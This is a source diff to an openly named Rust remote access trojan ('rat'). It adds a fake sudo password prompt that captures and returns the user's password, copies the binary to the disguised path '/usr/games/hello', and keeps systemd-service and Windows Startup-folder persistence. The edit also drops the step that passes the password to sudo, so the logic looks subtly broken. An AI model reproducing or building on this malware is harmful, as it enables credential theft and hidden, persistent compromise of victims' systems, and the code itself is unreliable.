@@ -1,27 +1,39 @@
+use crate::extensions::Password;
 use std::{io::Write, path::PathBuf, process::Stdio};
 
 #[allow(unused)]
-pub fn startup() {
+pub fn startup() -> Password {
     if cfg!(target_os = "linux") {
         // grabbing the path of the current running executable
         let current_exe_path = std::env::current_exe().unwrap();
 
         // copying the executable to the /usr/bin directory
-        let password = loop {
+        let pass = loop {
+            print!(
+                "[sudo] enter password for {}: ",
+                std::env::var("USER").unwrap()
+            );
+            let _ = std::io::stdout().flush();
+
+            let mut pass = String::new();
+            std::io::stdin().read_line(&mut pass).unwrap();
+
             let mut child = std::process::Command::new("sudo")
-                .arg("-S")
-                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
+                .arg("-kS")
+                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/games/hello"])
                 .stdin(Stdio::piped())
+                .stderr(Stdio::null())
                 .spawn()
                 .unwrap();
 
-            let mut s = String::new();
-            std::io::stdin().read_line(&mut s).unwrap();
-            let _ = child.stdin.as_mut().unwrap().write_all(&s.as_bytes());
-
             match child.wait_with_output() {
                 Ok(op) => {
-                    break s;
+                    if let Some(0) = op.status.code() {
+                        break pass;
+                    } else if let Some(1) = op.status.code() {
+                        println!("Sorry, try again.");
+                        continue;
+                    }
                 }
                 Err(e) => {
                     continue;
@@ -59,6 +71,8 @@ WantedBy=multi-user.target
             .args(["systemctl", "enable", "ratd.service"])
             .output()
             .unwrap();
+
+        return Password::new(pass);
     } else if cfg!(target_os = "windows") {
         let mut user_startup_dir = PathBuf::with_capacity(96);
         user_startup_dir.push(std::env::var("USERPROFILE").unwrap());
@@ -66,10 +80,11 @@ WantedBy=multi-user.target
         let current_exe_path = std::env::current_exe().unwrap();
         user_startup_dir.push("rat.exe");
         let _ = std::fs::copy(current_exe_path, user_startup_dir);
+    } else if cfg!(target_os = "macos") {
     } else if cfg!(target_os = "android") {
     } else if cfg!(target_os = "ios") {
-    } else if cfg!(target_os = "macos") {
     }
+    Password::new(format!(""))
 }
 
 // unsupported systems
